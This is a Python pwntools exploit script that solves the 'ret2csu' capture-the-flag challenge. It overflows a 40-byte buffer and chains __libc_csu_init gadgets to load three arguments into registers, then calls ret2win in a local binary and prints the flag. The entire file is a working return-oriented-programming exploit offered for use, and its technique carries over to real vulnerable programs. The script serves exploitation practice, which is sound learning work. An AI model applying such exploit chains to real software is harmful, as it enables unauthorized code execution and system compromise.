from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./ret2csu', checksec=False)
p = process()

# How many bytes to EIP?
padding = 40

# ROP
rop = ROP(elf)  # Load rop gadgets

params = [0xdeadbeefdeadbeef,
          0xcafebabecafebabe,
          0xd00df00dd00df00d]

# We can't easily pop final param to rdx so we need this:
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a  # pop rbp; pop rbx; pop r12; pop r13; pop r14; pop r15; ret
csu_mov = 0x400680  # mov rdx, r15; mov rsi, r14; mov edi, r13, call QWORD PTR [r12+rbx*8]; ret

# Note this doesn't work
# rop.call("ret2win", params)

rop.raw([
    pop_rbx_rbp_r12_r13_r14_r15,
    # Pop 3/4 to rbx/rbp, needed for CMP later
    0x3,
    0x4,
    0x600e30,  # Point to .fini
    params,  # params for ret2win
    csu_mov,  # Move from r13-r15 to rdx, rsi, rdi
    pack(0) * 7,  # Padding for the subsequent pops
    pop_rdi,
    params[0],  # Put deadbeef back in RDI (we only got 32-bit address in there earlier)
    elf.symbols.ret2win,  # Pwn
])

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Create payload
payload = flat(
    {padding: rop_chain}
)

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
